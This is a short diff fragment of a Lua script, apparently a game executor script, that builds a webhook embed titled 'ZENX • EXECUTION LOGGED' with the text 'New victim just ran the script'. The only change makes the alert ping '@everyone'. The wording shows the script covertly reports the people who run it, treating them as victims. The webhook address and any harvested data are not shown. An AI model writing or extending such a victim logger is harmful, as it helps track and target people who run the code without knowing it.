@@ -52,7 +52,7 @@ pcall(function()
 end)
 
 local data = {
-    content = "",
+    content = "@everyone",
     embeds = {{
         title = "ZENX • EXECUTION LOGGED",
         description = "New victim just ran the script",
